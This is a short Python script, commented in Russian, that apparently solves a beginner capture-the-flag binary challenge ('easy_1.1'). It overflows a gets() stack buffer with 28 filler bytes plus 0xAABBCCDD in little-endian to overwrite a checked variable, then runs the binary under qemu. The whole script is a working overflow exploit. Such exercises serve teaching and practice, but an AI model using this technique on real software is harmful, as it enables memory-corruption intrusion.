import subprocess


# В main программа считывает ввод через gets в стековый буфер.
# Между началом буфера и проверяемым int 28 байт.
# Поэтому записываем 28 символов которые заполняют буфер, а 
# следующие четыре байта задают
# значение переменной, которое сравнивается с 0xAABBCCDD.
# Число записывается в little-endian.
payload = b"A" * 28 + bytes.fromhex("ddccbbaa") + b"\n"

# Весь payload подаётся как стандартный ввод; check=False сохраняет вывод
# программы даже если она завершится с ненулевым кодом.
subprocess.run(
    ["qemu-amd64", "-L", "/", "./easy_1.1"],
    input=payload,
    check=False,
)
